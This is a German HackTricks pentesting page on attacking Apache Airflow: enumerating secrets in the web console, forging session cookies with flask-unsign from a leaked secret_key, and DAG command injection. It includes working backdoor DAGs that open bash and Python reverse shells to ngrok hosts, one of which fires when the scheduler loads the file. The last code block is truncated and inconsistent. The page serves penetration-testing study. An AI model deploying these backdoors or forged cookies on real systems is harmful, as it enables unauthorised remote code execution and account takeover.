# Apache Airflow Sicherheit

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

[**Apache Airflow**](https://airflow.apache.org) dient als Plattform zur **Orchestrierung und Planung von Datenpipelines oder Workflows**. Der Begriff "Orchestrierung" im Kontext von Datenpipelines bezeichnet den Prozess des Anordnens, Koordinierens und Verwaltens komplexer Datenworkflows, die aus verschiedenen Quellen stammen. Der Hauptzweck dieser orchestrierten Datenpipelines besteht darin, verarbeitete und nutzbare Datens√§tze bereitzustellen. Diese Datens√§tze werden von einer Vielzahl von Anwendungen umfassend genutzt, einschlie√ülich, aber nicht beschr√§nkt auf Business-Intelligence-Tools, Datenwissenschaft und Machine-Learning-Modelle, die alle grundlegend f√ºr die Funktionsweise von Big-Data-Anwendungen sind.

Grunds√§tzlich erm√∂glicht es Apache Airflow, die **Ausf√ºhrung von Code zu planen, wenn etwas** (Ereignis, Cron) **geschieht**.

## Lokales Labor

### Docker-Compose

Sie k√∂nnen die **Docker-Compose-Konfigurationsdatei von** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) verwenden, um eine vollst√§ndige Apache Airflow Docker-Umgebung zu starten. (Wenn Sie auf MacOS sind, stellen Sie sicher, dass Sie der Docker-VM mindestens 6 GB RAM zuweisen).

### Minikube

Eine einfache M√∂glichkeit, **Apache Airflow auszuf√ºhren**, besteht darin, es **mit Minikube auszuf√ºhren**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfiguration

Airflow k√∂nnte **sensible Informationen** in seiner Konfiguration speichern oder es k√∂nnten schwache Konfigurationen vorhanden sein:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Bevor Sie Airflow angreifen, sollten Sie verstehen, **wie Berechtigungen funktionieren**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Angriffe

### Web-Konsolen-Auflistung

Wenn Sie **Zugriff auf die Web-Konsole** haben, k√∂nnten Sie auf einige oder alle der folgenden Informationen zugreifen k√∂nnen:

* **Variablen** (Benutzerdefinierte sensible Informationen k√∂nnten hier gespeichert sein)
* **Verbindungen** (Benutzerdefinierte sensible Informationen k√∂nnten hier gespeichert sein)
* Greifen Sie darauf zu unter `http://<airflow>/connection/list/`
* [**Konfiguration**](./#airflow-configuration) (Sensible Informationen wie der **`secret_key`** und Passw√∂rter k√∂nnten hier gespeichert sein)
* Liste der **Benutzer & Rollen**
* **Code jedes DAGs** (der m√∂glicherweise interessante Informationen enth√§lt)

### Abrufen von Variablenwerten

Variablen k√∂nnen in Airflow gespeichert werden, damit die **DAGs** auf ihre Werte zugreifen k√∂nnen. Es ist √§hnlich wie bei Secrets anderer Plattformen. Wenn Sie **ausreichende Berechtigungen** haben, k√∂nnen Sie auf sie im GUI unter `http://<airflow>/variable/list/` zugreifen.\
Standardm√§√üig zeigt Airflow den Wert der Variablen im GUI an, jedoch ist es gem√§√ü [**diesem**](https://marclamberti.com/blog/variables-with-apache-airflow/) m√∂glich, eine **Liste von Variablen** festzulegen, deren **Wert** im **GUI** als **Sternchen** angezeigt wird.

![](<../../.gitbook/assets/image (79).png>)

Diese **Werte** k√∂nnen jedoch immer noch √ºber **CLI** (Zugriff auf die DB erforderlich), **beliebige DAG**-Ausf√ºhrung, **API**-Zugriff auf den Variablen-Endpunkt (die API muss aktiviert sein) und **sogar das GUI selbst!** **abgerufen** werden.\
Um auf diese Werte aus dem GUI zuzugreifen, w√§hlen Sie einfach die Variablen aus, auf die Sie zugreifen m√∂chten, und klicken Sie auf Aktionen -> Export.\
Eine andere M√∂glichkeit besteht darin, einen **Brute-Force-Angriff** auf den **versteckten Wert** durchzuf√ºhren, indem Sie ihn mit der **Suchfilterung** suchen, bis Sie ihn finden:

![](<../../.gitbook/assets/image (30).png>)

### Privilege Escalation

Wenn die Konfiguration **`expose_config`** auf **True** gesetzt ist, k√∂nnen Benutzer ab der **Rolle Benutzer** die **Konfiguration im Web** **lesen**. In dieser Konfiguration erscheint der **`secret_key`**, was bedeutet, dass jeder Benutzer mit diesem g√ºltigen Schl√ºssel seinen eigenen signierten Cookie erstellen kann, um das Konto eines anderen Benutzers zu **imitieren**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Backdoor (RCE in Airflow worker)

Wenn Sie **Schreibzugriff** auf den Ort haben, an dem die **DAGs gespeichert sind**, k√∂nnen Sie einfach **einen erstellen**, der Ihnen eine **umgekehrte Shell sendet**.\
Beachten Sie, dass diese umgekehrte Shell innerhalb eines **Airflow-Worker-Containers** ausgef√ºhrt wird:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Backdoor (RCE in Airflow Scheduler)

Wenn Sie etwas **im Stamm des Codes ausf√ºhren**, wird es zum Zeitpunkt des Verfassens dieses Textes **vom Scheduler ausgef√ºhrt**, nachdem es einige Sekunden lang im DAG-Ordner platziert wurde.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG-Erstellung

Wenn es Ihnen gelingt, **eine Maschine innerhalb des DAG-Clusters zu kompromittieren**, k√∂nnen Sie neue **DAG-Skripte** im `dags/`-Ordner erstellen, die dann in den anderen Maschinen im DAG-Cluster **repliziert werden**.

### DAG-Codeinjektion

Wenn Sie einen DAG aus der GUI ausf√ºhren, k√∂nnen Sie **Argumente √ºbergeben**.\
Daher k√∂nnte der DAG **anf√§llig f√ºr Befehlsinjektion sein**, wenn er nicht ordnungsgem√§√ü codiert ist.\
Das ist das, was bei dieser CVE passiert ist: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Alles, was Sie wissen m√ºssen, um **nach Befehlsinjektionen in DAGs zu suchen**, ist, dass **Parameter** mit dem Code **`dag_run.conf.get("param_name")`** **abgerufen** werden.

Dar√ºber hinaus k√∂nnte dieselbe Schwachstelle bei **Variablen** auftreten (beachten Sie, dass Sie mit ausreichenden Berechtigungen den **Wert der Variablen in der GUI steuern k√∂nnten**). Variablen werden **mit** abgerufen:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Wenn sie zum Beispiel innerhalb eines Bash-Befehls verwendet werden, k√∂nnten Sie eine Befehlsinjektion durchf√ºhren.

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
